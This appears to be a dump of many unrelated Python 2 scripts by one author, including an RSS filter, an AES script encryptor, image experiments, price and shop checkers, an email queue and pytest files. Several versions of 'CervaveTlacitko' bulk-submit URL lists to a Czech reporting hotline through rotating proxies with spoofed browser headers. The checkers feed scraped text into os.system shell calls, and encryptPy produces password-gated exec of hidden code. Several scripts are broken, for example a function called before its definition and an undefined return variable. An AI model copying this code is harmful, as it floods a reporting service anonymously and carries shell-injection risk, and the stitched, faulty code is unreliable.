    print "\t RSSFilter.py [-n] link tag keyword1 [keyword2 .. keywordn]"
    print
    print "\t\t -n"
    print "\t\t\t Negative logic - pass all except items which have tag"
    print "\t\t\t with keywords."
    print
    print "\t\t link"
    print "\t\t\t Link to xml file with RSS. Must starts with http://"
    print
    print "\t\t tag"
    print "\t\t\t Tag where script will be looking for keywords"
    print
    print "\t\t keywords"
    print "\t\t\t Keywords for filtering."
    print
  
# delete multiple blank lines
def removeNewlines(text):
    tmp = str(text).splitlines()
    
    data = ""
    for i in range(len(tmp) - 1):
        if tmp[i] == "" and tmp[i + 1] == "":
            continue
        else:
            data += tmp[i] + "\n"
    data += tmp[-1]
    
    return data

#===============================================================================
#= Main program ================================================================
#===============================================================================
# parse parameters
if len(sys.argv) < 2:
    printHelp() 
    sys.exit()
else:
    negativeflag = False
    
    for i in sys.argv:
        if "-n" == i:
            negativeflag = True
            break
    
    if negativeflag:
        addr     = sys.argv[2]
        tag      = sys.argv[3]
        keywords = sys.argv[4:]
    else:
        addr     = sys.argv[1]
        tag      = sys.argv[2]
        keywords = sys.argv[3:]

# check link 
if not "http" in addr:
    keywords.append(tag)
    tag = addr
    
# read until EOF
addr = ""
try:
    while True:
        addr += raw_input() + "\n"
except EOFError, e:
    pass

# remove items
d = feedparser.parse(addr)["items"]
for item in d:
    for key in keywords:
        if negativeflag:
            if key in item[tag]:
                item = ""
        else:
            if not key in item[tag]:
                item = ""

tmp = str(d)            # vystup prevede zpet na text
print removeNewlines(addr)  # vypise text upraveny tak aby neobsahoval zbytecne prazdne radky


#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#~ CervaveTlacitko v2.0.1
#~
# imports
import urllib
import urllib2
import sys
import random

# variables
urllist  = []
proxylist = []
url = "http://ohlaste.horkalinka.cz/redButton/insert.asp"
#url = "http://anoncheck.security-portal.cz"

# functions & objects
def printHelp():
    print
    print "Usage:"
    print "\tpython CervaveTlacitko.py urllist.txt [HTTProxyList.txt]"
    print
    print
    print "Urllist sample:"
    print "--"
    print "http://url.tld"
    print "http://google.com"
    print "--"
    print
    print "HTTProxylist sample:"
    print "--"
    print "127.0.0.1:8080"
    print "195.70.55.151:80"
    print "--"
    print

def IEHeaders():
    headers = {
        "User-Agent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
        "Accept": "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain",
        "Accept-Language": "cs,en-us;q=0.7,en;q=0.3",
        "Accept-Charset": "utf-8; windows-1250",
        "Keep-Alive": "300",
        "Connection": "keep-alive",
    }
    return headers
    
# main program
if (len(sys.argv) == 2) or (len(sys.argv) == 3):
    try:                                        # open file with list of urls
        file = open(sys.argv[1], "r")
        urllist = file.read().splitlines()
        file.close()
    except:
        printHelp()
        exit()
        
    if len(sys.argv) == 3:
        try:                                    # open file with list of proxies
            file = open(sys.argv[2], "r")
            proxylist = file.read().splitlines()
            file.close()
        except:
            printHelp()
            exit()
else:
    printHelp()
    exit()
    
par = {}
for i in urllist:
    par["text"] = ""
    par["url"]  = i
    
    print "Sending", i,
    
    if len(proxylist) > 0:
        proxy = proxylist[random.randint(0, len(proxylist) - 1)]
        urllib2.install_opener(urllib2.build_opener(urllib2.ProxyHandler({'http': proxy})))
        print "as", proxy
    else:
        print
  
    try:
        req = urllib2.Request(url + "?" + urllib.urlencode(par), None, IEHeaders())
        f = urllib2.urlopen(req)
        print f.read()
        #f.read()
        f.close()
    except:
        print
        print ">> Error: Page", url, "not found <<"
        print "Try change \"url\" variable into correct form"
        print
        exit()
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#~ CervaveTlacitko v2.1.0
#~
# imports
import urllib
import urllib2
import sys
import random
import time

# variables
urllist  = []
proxylist = []
url = "http://ohlaste.horkalinka.cz/redButton/insert.asp"
#url = "http://anoncheck.security-portal.cz"

# functions & objects
def printHelp():
    print
    print "Usage:"
    print "\tpython CervaveTlacitko.py urllist.txt [HTTProxyList.txt]"
    print
    print
    print "Urllist sample:"
    print "--"
    print "http://url.tld"
    print "http://google.com"
    print "--"
    print
    print "HTTProxylist sample:"
    print "--"
    print "127.0.0.1:8080"
    print "195.70.55.151:80"
    print "--"
    print

def IEHeaders():
    headers = {
        "User-Agent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
        "Accept": "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain",
        "Accept-Language": "cs,en-us;q=0.7,en;q=0.3",
        "Accept-Charset": "utf-8; windows-1250",
        "Keep-Alive": "300",
        "Connection": "keep-alive",
    }
    return headers
    
# main program
if (len(sys.argv) == 2) or (len(sys.argv) == 3):
    try:                                        # open file with list of urls
        file = open(sys.argv[1], "r")
        urllist = file.read().splitlines()
        file.close()
    except:
        printHelp()
        exit()
        
    if len(sys.argv) == 3:
        try:                                    # open file with list of proxies
            file = open(sys.argv[2], "r")
            proxylist = file.read().splitlines()
            file.close()
        except:
            printHelp()
            exit()
else:
    printHelp()
    exit()
    
par = {}
for i in urllist:
    par["text"] = ""
    par["url"]  = i
    par["date"] = time.strftime("%d.%m.%Y %H:%M:%S")
    
    print "Sending", i,
    
    if len(proxylist) > 0:
        proxy = proxylist[random.randint(0, len(proxylist) - 1)]
        urllib2.install_opener(urllib2.build_opener(urllib2.ProxyHandler({'http': proxy})))
        print "as", proxy
    else:
        print
  
    try:
        req = urllib2.Request(url + "?" + urllib.urlencode(par), None, IEHeaders())
        f = urllib2.urlopen(req)
        print f.read()
        #f.read()
        f.close()
    except:
        print
        print ">> Error: Page", url, "not found <<"
        print "Try change \"url\" variable into correct form"
        print
        exit()
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# CervaveTlacitko v1.0.0
# imports
import urllib
import urllib2
import sys

# variables
urllist = []
url = "http://web03.czi.cz/redButton/insert.asp"

# functions & objects
def printHelp():
    print
    print "Usage:"
    print "\tpython CervaveTlacitko.py urllist.txt"
    print


def IEHeaders():

    headerss = {
        "User-Agent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
        "Accept": "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain",
        "Accept-Language": "cs,en-us;q=0.7,en;q=0.3",
        "Accept-Charset": "utf-8; windows-1250",
        "Keep-Alive": "300",
        "Connection": "keep-alive",
    }

    return headers

# main program
if len(sys.argv) != 2:
    printHelp()
    exit()

try:
    file = open(sys.argv[1], "r")
    urllist = file.read().splitlines()
    file.close()
except:
    printHelp()
    exit()
    
par = {}
for i in urllist:
    par["text"] = ""
    par["url"]  = i
  
    try: 
        req = urllib2.Request(url + "?" + urllib.urlencode(par), None, IEHeaders())
        f = urllib2.urlopen(req)
        print f.read()
        f.close()
    except:
        print
        print ">> Error: Page not found <<"
        print "Try change \"url\" variable into correct form"
        print
        exit()

#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# encryptPy.py v1.0.0 (10.09.2009) by Bystroushaak - bystrousak@kitakitsune.org.
#
#  Pomoci 256b AES zasifruje vstupni .py soubor, takze k jeho spusteni bude zapotrebi heslo.
#  Encrypt input .py file with 256b AES, so you will need password for execute.
#
# This work is licensed under a Creative Commons Attribution-Noncommercial-Share Alike 3.0
# Unported License (http://creativecommons.org/licenses/by-nc-sa/3.0/cz/).
# Created in gedit text editor.
#
## Pokud hodlate pouzivat tento script, byl bych rad za zpetnou vazbu v podobe kratkeho informacniho
## emailu (napriklad maly popis kde budete script vyuzivat, nebo jen zminku o tom ze script pouzivate).
## U vetsiny scriptu co jsem stvoril totiz nemam tuseni jestli upadly do zapomeni, nebo jsou uzitecne
## i nekomu jinemu nez me. Diky
#
# imports
import sys

from Crypto.Cipher import AES
import base64
import md5
import sha
import getpass

# outdata - imports
imports= """#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Encrypted by encryptPy (http://kitakitsune.org/texty/tools/encryptPy.html)

import sys
from Crypto.Cipher import AES
import base64
import md5
import sha
import getpass
"""

# outdata - encrypt functions
fcions= """
def getPasswd():
    passwd = sha.new(getpass.getpass("Passwd: ")).hexdigest()
    passwd2 = passwd[:20]
    passwd = passwd[20:]

    for i in range(2204):
        passwd += sha.new(passwd + str(i * (i % 4))).hexdigest()
        passwd2 += md5.new(passwd + str(i * (i % 7))).hexdigest()

    return md5.new(passwd + passwd2).hexdigest()

def decdata(passwd, data):
    aes = AES.new(passwd, AES.MODE_CFB)

    return aes.decrypt(base64.b64decode(data))

"""

# outdata - main program
code= """\n
try:
    passwd= getPasswd()
    exec(decdata(passwd, AESdata))
except TypeError:
    print "Bad password!"
"""

# functions & objects
## return hash of passwd
def getPasswd():
    passwd = sha.new(getpass.getpass("Passwd: ")).hexdigest()
    passwd2 = passwd[:20]
    passwd = passwd[20:]

    for i in range(2204):
        passwd += sha.new(passwd + str(i * (i % 4))).hexdigest()
        passwd2 += md5.new(passwd + str(i * (i % 7))).hexdigest()

    return md5.new(passwd + passwd2).hexdigest()

## enctypt data with passwd
def encdata(passwd, data):
    aes = AES.new(passwd, AES.MODE_CFB)

    return base64.b64encode(aes.encrypt(data))

## decode data with passwd
def decdata(passwd, data):
    aes = AES.new(passwd, AES.MODE_CFB)

    return aes.decrypt(base64.b64decode(data))

def printHelp():
    print """usage:
    python encryptPy.py -e infile outfile
        -e or --encode
            Encode infile into outfile.

        -d or --decode
            Decode infile into outfile

            """

    sys.exit()

# parse cmd args (filenam etc..)
def parseArgs():
    what = "e"

    argv = sys.argv
    if len(argv) > 1 and len(argv) <= 4:
        for i in range(len(argv)):
            if argv[i].startswith("--help") or argv[i].startswith("-h"):
                print "Help:"
                printHelp()
            elif argv[i].startswith("-d") or argv[i].startswith("--decode"):
                what = "d"
            elif argv[i].startswith("-e") or argv[i].startswith("--encode"):
                what = "e"

        try:
            infile = argv[len(argv) - 2]
            outfile = argv[len(argv) - 1]
        except:
            print "You must specify input and output files!"
            printHelp()
    else:
        print "Bad arguments!"
        printHelp()

    return infile, outfile, what

breakTo("asd")

## breaks string into num chars long lines
def breakTo(string, num= 80):
    ostr= ""

    for i in range(len(string)):
        ostr+= string[i]
        if i % num == 0:
            ostr+= "\n"

    return ostr



# main program
infile, outfile, what= parseArgs()

# read input file
try:
    file = open(infile, "r")
    data = file.read()
    file.close()
except IOError, e:
    print "Error!"
    print "Infile \"" + infile + "\" not found!"
    printHelp()
    sys.exit()

passwd= getPasswd() # read passwds

# what to do
if what == "e":                     # encrypt data
    AESdata= encdata(passwd, data)
    odata= imports + fcions + "AESdata= \"\"\"\n" + breakTo(AESdata, 80) + "\n\"\"\"" + code    # create output
else:                               # decrypt data
    data= data.splitlines()

    # parse AESdata string
    AESdata= ""
    lck= False
    for i in data:
        if lck and i.endswith("\"\"\""):
            AESdata+= i
            break
        if lck:
            AESdata+= i
        if i.startswith("AESdata= ") and not lck:
            AESdata+= i
            lck= True

    odata= decdata(passwd, "".join(AESdata[12:-3].splitlines()))

# save output file
try:
    file = open(outfile, "w")
    file.write(odata)
    file.close()
except IOError, e:
    print "Error!"
    print "Outfile \"" + outfile + "\" couldn't be saved!"
    print "Read only filesystem or not enough space on drive."
    sys.exit()
import Image
import os
import sys
from opencv.cv import *
from opencv.highgui import *

def analyzeImage(f,name):


      im=Image.open(f)
      try:
            if(im.size[0]==1 or im.size[1]==1):
                  return
            print (name+' : '+str(im.size[0])+','+ str(im.size[1]))
            le=1
            if(type(im.getpixel((0,0)))==type((1,2))):
                  le=len(im.getpixel((0,0))) 
            gray = cvCreateImage (cvSize (im.size[0], im.size[1]), 8, 1)
            edge1 = cvCreateImage (cvSize (im.size[0], im.size[1]), 32, 1)
            edge2 = cvCreateImage (cvSize (im.size[0], im.size[1]), 8, 1)
            edge3 = cvCreateImage (cvSize (im.size[0], im.size[1]), 32, 3)

            for h in range(im.size[1]):
                  for w in range(im.size[0]):
                        p=im.getpixel((w,h))
                        if(type(p)==type(1)):
                              gray[h][w] = im.getpixel((w,h))
                        else:
                              gray[h][w] = im.getpixel((w,h))[0]

            cvCornerHarris(gray,edge1,5,5,0.1)
            cvCanny(gray,edge2,20,100)

            cvNamedWindow("win")
            cvShowImage("win", gray);
            cvNamedWindow("win2")
            cvShowImage("win2", edge1);
            cvNamedWindow("win3")
            cvShowImage("win3", edge2);

            cvWaitKey()

            f.close()
      except Exception,e:
            print e
            print 'ERROR: problem handling '+ name


f = open(sys.argv[1],'r')
analyzeImage(f,sys.argv[1])#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# NONAME v0.0.0 (dd.mm.yy) by Bystroushaak (bystrousak@kitakitsune.org)
# This work is licensed under a Creative Commons Attribution-Noncommercial-Share Alike 3.0 
# Unported License (http://creativecommons.org/licenses/by-nc-sa/3.0/cz/).
# Created in §Editor text editor.
#
#   Pokud hodlate pouzivat tento script, byl bych rad za zpetnou vazbu v podobe kratkeho informacniho 
#   emailu (napriklad maly popis kde budete script vyuzivat, nebo jen zminku o tom ze script pouzivate).
#   U vetsiny scriptu co jsem stvoril totiz nemam tuseni jestli upadly do zapomeni, nebo jsou uzitecne 
#   i nekomu jinemu nez me. Diky.
#
#   If you want to use this script, I'd be happy if you drop me a small feedback message. For example 
#   something about where you use this script, or just a message that this script is useful for you.
#   For most of my scripts, I dont know if they are forgotten, or they are usefull for other people.
#   Thanks.
#   
#
# Notes:
    # 
#===============================================================================
# Imports ======================================================================
#===============================================================================
import Image


#===============================================================================
# Variables ====================================================================
#===============================================================================
im = Image.open("DSCF1030.JPG")
#~ im = Image.open("s6004472.jpg")


#===============================================================================
#= Functions & objects =========================================================
#===============================================================================



#===============================================================================
#= Main program ================================================================
#===============================================================================
import ImageFilter
#~ im.filter(ImageFilter.FIND_EDGES).show()

import ImageEnhance
ImageEnhance.Contrast(im).enhance(5).filter(ImageFilter.FIND_EDGES).show()
#~ im.show()


#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================



# Variables ===================================================================



# Functions & classes =========================================================



# Main program ================================================================
if __name__ == '__main__':
    pass
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import dhtmlparser
from httpkie import Downloader


# Functions & classes =========================================================
class Price(str):
    def __new__(self, price, currency, *args, **kwargs):
        return super(Price, self).__new__(self, price + " " + currency)

    def __init__(self, price, currency):
        self.price = price
        self.currency = currency

        super(Price, self).__init__(price + " " + currency)


def download_data(url):
    return Downloader().download(url)


def parse_price(app_url):
    data = download_data(app_url)
    dom = dhtmlparser.parseString(data)

    offers_tag = dom.find("div", {"itemprop": "offers"})[0]

    price_tag = offers_tag.find("meta", {"itemprop": "price"})[0]
    price_currency_tag = offers_tag.find(
        "meta",
        {"itemprop": "priceCurrency"}
    )[0]

    price = price_tag.params["content"]
    currency = price_currency_tag.params["content"]

    return Price(price, currency)


# Main program ================================================================
if __name__ == '__main__':
    print parse_price("http://store.steampowered.com/app/246090/")
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
"""
Module is containing all necessary global variables for the package.

Module also has the ability to read user-defined data from two paths:

- ``$HOME/_SETTINGS_PATH``
- ``/etc/_SETTINGS_PATH``

See :attr:`._SETTINGS_PATH` for details.

Note:
    If the first path is found, other is ignored.

Example of the configuration file (``$HOME/.pAPI/settings.json``)::

    {
        "NOTIFICATORS_SMS_USERNAME": "username",
        "NOTIFICATORS_SMS_PASSWORD": "password"
    }

Attributes
----------
"""
# Imports =====================================================================
import json
import os
import os.path

from os.path import dirname, normpath


# Module configuration ========================================================

#: Configuration of the SMS notificator.
NOTIFICATORS_SMS_USERNAME = ""
NOTIFICATORS_SMS_PASSWORD = ""

#: Configuration of the Email notificator
NOTIFICATORS_EMAIL_ADDRESS = ""
NOTIFICATORS_EMAIL_PORT = 0
NOTIFICATORS_EMAIL_USERNAME = ""
NOTIFICATORS_EMAIL_PASSWORD = ""

#: Runner
RUNNER_SCRIPT_PATH = normpath(dirname(__file__) + "/../scripts")

DATABASE_PATH = normpath(dirname(__file__) + "/../database")


# User configuration reader (don't edit this ==================================
_ALLOWED = [str, unicode, int, float, long]
_SETTINGS_PATH = ".pAPI/settings.json"  #: appended to default search paths


def get_all_constants():
    """
    Get list of all uppercase, non-private globals (doesn't start with ``_``).

    Returns:
        list: Uppercase names defined in `globals()` (variables from this \
              module).
    """
    return [
        key for key in globals().keys()
        if all([
            not key.startswith("_"),          # publicly accesible
            key.upper() == key,               # uppercase
            type(globals()[key]) in _ALLOWED  # and with type from _ALLOWED
        ])
    ]


def substitute_globals(config_dict):
    """
    Set global variables to values defined in `config_dict`.

    Args:
        config_dict (dict): dict with data, which are used to set `globals`.

    Note:
        `config_dict` have to be dictionary, or it is ignored. Also all
        variables, that are not already in globals, or are not types defined in
        :attr:`_ALLOWED` (str, int, ..) or starts with ``_`` are silently
        ignored.
    """
    constants = get_all_constants()

    if type(config_dict) != dict:
        return

    for key, val in config_dict.iteritems():
        if key in constants and type(val) in _ALLOWED:
            globals()[key] = val


def read_from_paths():
    """
    Try to read data from configuration paths ($HOME/_SETTINGS_PATH,
    /etc/_SETTINGS_PATH).
    """
    home = os.environ.get("HOME", None)
    home_path = os.path.join(home, _SETTINGS_PATH)
    etc_path = os.path.join("/etc", _SETTINGS_PATH)

    read_path = None
    if home and os.path.exists(home_path):
        read_path = home_path
    elif os.path.exists(etc_path):
        read_path = etc_path

    if read_path:
        with open(read_path) as f:
            substitute_globals(
                json.loads(f.read())
            )


read_from_paths()
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from steam_watcher import SteamWatcher
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import transaction
from persistent import Persistent

from ..source.steam_price_parser import parse_price


# Functions & classes =========================================================
class SteamWatcher(Persistent):
    def __init__(self, name, url):
        self.name = name
        self.url = url

        self.price = None
        self.old_price = None

    def check_price(self):
        price = parse_price(self.url)

        if price != self.price:
            if self.price is not None:
                self.send_message()

            with transaction:
                self.old_price = self.price
                self.price = price

    def send_message(self):
        queue_email(
            to="bystrousak@kitakitsune.org",
            subject="Price changed: %s" % self.name,
            body="From %s to %s.\nSee %s for details." % (
                self.old_price,
                self.price,
                self.url,
            )
        )

    def run(self):
        self.check_price()
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================



# Variables ===================================================================



# Functions & classes =========================================================



# Main program ================================================================
if __name__ == '__main__':
    pass
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================



# Variables ===================================================================



# Functions & classes =========================================================



# Main program ================================================================
if __name__ == '__main__':
    pass
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import base64

import transaction
from persistent import Persistent

from sender import Mail
from sender import Message
from sender import Attachment

from ..settings import NOTIFICATORS_EMAIL_ADDRESS
from ..settings import NOTIFICATORS_EMAIL_PORT
from ..settings import NOTIFICATORS_EMAIL_USERNAME
from ..settings import NOTIFICATORS_EMAIL_PASSWORD


# Functions & classes =========================================================
class EmailPusher(Persistent):
    def __init__(self, logger=None):
        self.queue = []  # TODO: use better datastructure
        self.logger = logger

    def queue_email(self, to, subj, body, html=None, attachments=[],
                    charset="utf-8"):
        # construct message
        msg = Message(subj)
        msg.fromaddr = ("pAPI Notificator", NOTIFICATORS_EMAIL_USERNAME)
        msg.to = to
        msg.body = body
        msg.html = html
        msg.charset = charset

        # attach files
        for name, mime, data in attachments:
            msg.attach(
                Attachment(name, mime, base64.b64decode(data))
            )

        with transaction.manager:
            self.queue.append(msg)

    @staticmethod
    def _send_message(message):
        assert isinstance(message, Message)

        # server details
        mail = Mail(
            NOTIFICATORS_EMAIL_ADDRESS,
            port=NOTIFICATORS_EMAIL_PORT,
            username=NOTIFICATORS_EMAIL_USERNAME,
            password=NOTIFICATORS_EMAIL_PASSWORD,
            use_tls=False,
            use_ssl=True,
        )

        return mail.send(message)

    def _log(self, email):
        if self.logger:
            self.logger(self, email)

    def run(self):
        successfully_sent = []

        for email in self.queue:
            EmailPusher._send_message(email)
            successfully_sent.append(email)

        for email in successfully_sent:
            with transaction.manager:
                self._log(email)
                self.queue.remove(email)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from email_pusher import EmailPusher
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import random
import string

import pytest
import requests

from attribute_wrapper import JSONWrapper

from plugins import settings


# Functions & classes =========================================================
@pytest.fixture
def pAPI():
    return JSONWrapper(settings.URL)


def randomword(length):
    return ''.join(
        random.choice(string.lowercase) for i in range(length)
    )


def get_random_key(database_keys):
    key = randomword(10)

    while key in database_keys:
        key = randomword(10)

    return key


# Variables ===================================================================
RAND_KEY = randomword(10)
RAND_VAL = randomword(10)


# Tests =======================================================================
def test_load_error_key(pAPI):
    subset = pAPI.core.key_val.keys.get()

    # generate random key
    global RAND_KEY
    RAND_KEY = get_random_key(subset)
    assert RAND_KEY not in subset

    assert pAPI.core.key_val.get(key=RAND_KEY) is None


def test_save(pAPI):
    subset = pAPI.core.key_val.keys.get()

    # generate random key
    global RAND_KEY
    RAND_KEY = get_random_key(subset)
    assert RAND_KEY not in subset

    # save RAND_VAL
    pAPI.core.key_val.post(key=RAND_KEY, val=RAND_VAL)

    # make sure, that key was really saved
    subset = pAPI.core.key_val.keys.get()
    assert RAND_KEY in subset

    assert pAPI.core.key_val.get(key=RAND_KEY) == RAND_VAL


def test_update(pAPI):
    global RAND_VAL
    RAND_VAL = "azgabash"

    pAPI.core.key_val.post(key=RAND_KEY, val=RAND_VAL)

    assert pAPI.core.key_val.get(key=RAND_KEY) == RAND_VAL


def test_delete(pAPI):
    subset = pAPI.core.key_val.keys.get()
    assert RAND_KEY in subset

    pAPI.core.key_val.delete(key=RAND_KEY)

    subset = pAPI.core.key_val.keys.get()
    assert RAND_KEY not in subset


def teardown_module(module):
    papi = pAPI()

    try:
        papi.core.key_val.delete(key=RAND_KEY)
    except requests.HTTPError:
        pass
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import time
import random
from multiprocessing import Process, Value

import pytest
from bottle import Bottle, run, get
from bottle_rest import json_to_params
from attribute_wrapper import JSONWrapper
import requests

from plugins import settings


# Variables ===================================================================
SERV = None

ADDR = 'localhost'
PORT = random.randint(10000, 65500)

SERVICE_PATH = "test_service"
URL = 'http://%s:%d/%s' % (ADDR, PORT, SERVICE_PATH)

TEST_DATA = {"arg1": 1, "arg2": "azgabash"}
CORRECTLY_TICKED = Value("b", False)


# Fixtures ====================================================================
@pytest.fixture
def pAPI():
    return JSONWrapper(settings.URL)


@pytest.fixture
def ticker():
    return pAPI().core.ticker


# Functions & classes =========================================================
def run_bottle_server():
    # set simple REST service using bottle
    app = Bottle()

    @app.get("/" + SERVICE_PATH)
    @json_to_params
    def test_service(arg1, arg2):
        assert arg1 == TEST_DATA["arg1"]
        assert arg2 == TEST_DATA["arg2"]

        CORRECTLY_TICKED.value = True

    run(app, host=ADDR, port=PORT)


def setup_module(module):
    # run the service in own subprocess
    global SERV
    SERV = Process(target=run_bottle_server)
    SERV.start()

    # pytest.set_trace()


def test_api_running(pAPI):
    try:
        pAPI.get()
    except requests.ConnectionError:
        pytest.exit("pAPI server not found.")


def test_ticker(ticker):
    ticker.put(period=5, url=URL, method="GET", data=TEST_DATA)

    # test that it is ticked automatically after adding
    assert not CORRECTLY_TICKED.value
    assert URL in ticker.get()
    assert CORRECTLY_TICKED.value

    CORRECTLY_TICKED.value = False

    # test that the timer in ticker actually works
    time.sleep(2)
    assert URL in ticker.get()
    assert not CORRECTLY_TICKED.value

    # now it should be ticked
    time.sleep(4)
    assert URL in ticker.get()
    assert CORRECTLY_TICKED.value


def teardown_module(module):
    """
    Shut down server subprocess.

    This is something like module destructor.
    """
    # shut down the service
    SERV.terminate()
    ticker().delete(url=URL)
    assert URL not in ticker().get()

    # test that server was really closed
    with pytest.raises(requests.exceptions.ConnectionError):
        requests.get(URL)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import pytest

from test_key_val import pAPI


# Variables ===================================================================



# Functions & classes =========================================================
@pytest.fixture
def fixture():
    pass

with pytest.raises(Exception):
    raise Exception()


# Tests =======================================================================
def test_():
    pass
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Stoyan checker v1.0.0 (04.09.2012) by Bystroushaak (bystrousak@kitakitsune.org)
# This work is licensed under a Creative Commons Attribution-Noncommercial-Share Alike 3.0 
# Unported License (http://creativecommons.org/licenses/by-nc-sa/3.0/cz/).
# Created in Sublime Text 2 editor.
#
# Notes:
    # 
#===============================================================================
# Imports ======================================================================
#===============================================================================
import os
import sys
import time
import shelve


import CheckerTools as c
import dhtmlparser as d



# react to queries
if len(sys.argv) > 1:
	if sys.argv[1] == "--next-run":
		print int(time.time()) + (60 * 60 * 24 * 7) # one week
	elif sys.argv[1] == "--timeout":
		print 60 * 60 # 1hr
	
	sys.exit(0)



#===============================================================================
# Variables ====================================================================
#===============================================================================
url = "http://projects.stoyan.cz/"
db = shelve.open("old_projects.dat")

if db.has_key("old_projects"):
	old_projects = db["old_projects"]
else:
	old_projects = []



#===============================================================================
#= Main program ================================================================
#===============================================================================
mail = "New projects at " + url + "\n\n"

send = False
for l in d.parseString(c.getPage(url)).find("table")[0].find("a"):
	if "name" in l.params:
		p = l.getContent()
		
		if p not in old_projects:
			mail += " - " + p + "\n"
			
			old_projects.append(p)
			send = True


# payload
if send:
	if 0 != os.system("mailer -f hlubina@internetu.net -t bystrousak@kitakitsune.org -s 'stoyans projects' <<LKNDFOJASDKJ-\n" + mail + "\nLKNDFOJASDKJ-"):
		raise Exception("Can't send mail! Check your mailer!")


db["old_projects"] = old_projects
db.close()
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Fantasya.cz checker v1.0.0 (05.05.2012) by Bystroushaak (bystrousak@kitakitsune.org)
# This work is licensed under a Creative Commons Attribution-Noncommercial-Share Alike 3.0 
# Unported License (http://creativecommons.org/licenses/by-nc-sa/3.0/cz/).
# Created in §Editor text editor.
#
#   Pokud hodlate pouzivat tento script, byl bych rad za zpetnou vazbu v podobe kratkeho informacniho 
#   emailu (napriklad maly popis kde budete script vyuzivat, nebo jen zminku o tom ze script pouzivate).
#   U vetsiny scriptu co jsem stvoril totiz nemam tuseni jestli upadly do zapomeni, nebo jsou uzitecne 
#   i nekomu jinemu nez me. Diky.
#
#   If you want to use this script, I'd be happy if you drop me a small feedback message. For example 
#   something about where you use this script, or just a message that this script is useful for you.
#   For most of my scripts, I dont know if they are forgotten, or they are usefull for other people.
#   Thanks.
#   
#
# Notes:
    # 
#===============================================================================
# Imports ======================================================================
#===============================================================================
import os
import os.path
import sys
import time
import shelve


import CheckerTools as c
import dhtmlparser as d


# react to queries
if len(sys.argv) > 1:
	if sys.argv[1] == "--next-run":
		print int(time.time()) + (60 * 60 * 24 * 7) # once per wekS
	elif sys.argv[1] == "--timeout":
		print 60 * 5 # 5m
	
	sys.exit(0)



#===============================================================================
# Variables ====================================================================
#===============================================================================
SEARCHES_TXT = "searches.txt"

base_url = "http://www.fantasya.cz"
url = base_url + "/shop_browse.php?where=shop_product&referrer=search&keywords="
db = shelve.open("old_books.dat")

if db.has_key("old"):
	old = db["old"]
else:
	old = {}

if os.path.exists(SEARCHES_TXT):
	file = open(SEARCHES_TXT)
	searches = map(lambda x: x.strip().replace(" ", "+"), file.read().splitlines())
else:
	sys.stderr.write("Searches not defined!\nCreate file '" + SEARCHES_TXT + "' and fill it with something, god dammit!\n")
	sys.exit(0)


#===============================================================================
#= Main program ================================================================
#===============================================================================
mail = "Fantasya checker brings you new content:\n\n"

send = False
for keyword in searches:
	data = c.getPage(url + keyword)

	if keyword not in old:
		old[keyword] = []
	
	for l in d.parseString(data).find("a"):
		if "href" in l.params and l.params["href"].startswith("/zbozi/") and len(l.childs) > 0 and not l.childs[0].isTag():
			name = l.getContent()
			link = base_url + l.params["href"]
		
			if name not in old[keyword]:
				if keyword not in mail:
					mail += "\nKeyword: " + keyword + ";"
				mail += "\t" + name + "; " + link + "\n"
			
				send = True
				old[keyword].append(name)


# payload
if send:
	if 0 != os.system("mailer -f hlubina@internetu.net -t bystrousak@kitakitsune.org -s 'Fantasya.cz checker' <<LKNDFOJASDKJ-\n" + mail + "\nLKNDFOJASDKJ-"):
		raise Exception("Can't send mail! Check your mailer!")


db["old"] = old
db.close()
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# zonerpress.cz v1.0.0 (28.03.2012) by Bystroushaak (bystrousak@kitakitsune.org)
# This work is licensed under a Creative Commons 3.0 
# Unported License (http://creativecommons.org/licenses/by/3.0/).
# Created in Geany text editor.
#
# Notes:
    # 
#= Imports =====================================================================
import dhtmlparser as d
import CheckerTools as ch
from api.book import Book


#= Main program ================================================================
for book in d.parseString(ch.getPage("http://zonerpress.cz/inshop/scripts/rss.aspx")).find("item"):
	if len(book.find("title")) == 0:
		continue
	
	b = Book()
	b.name = book.find("title")[0].getContent().strip()
	b.url = book.find("link")[0].getContent()
	
	dom = d.parseString(ch.getPage(b.url))
	
	b.descr = ch.getVisibleText(dom.find("div", {"class":"popis"})[0].getContent())
